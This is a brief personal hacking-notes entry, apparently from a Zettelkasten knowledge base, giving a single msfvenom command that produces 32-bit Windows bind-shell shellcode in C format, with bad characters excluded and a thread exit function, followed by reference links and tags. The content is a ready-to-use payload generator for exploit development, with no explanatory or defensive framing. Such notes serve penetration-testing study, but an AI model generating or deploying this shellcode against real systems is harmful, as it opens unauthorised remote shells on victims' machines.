# MSFVENOM Windows Binary (.exe) executable 32 Bit (x86) Bind Shell Output in Hex, C Style, Exclude bad chars, Exitfunction thread
```bash
msfvenom -p windows/shell_bind_tcp LHOST=$LHOST LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

# References
- [20221003150773](/zet/20221003150773/README.md) MSFVENOM Windows Binary (.exe) executable 32 Bit (x86) Bind Shell
- ~/kb/hacking/commands/msfvenom-commands.md

Tags:
    #assorted #command #hacking #msfvenom
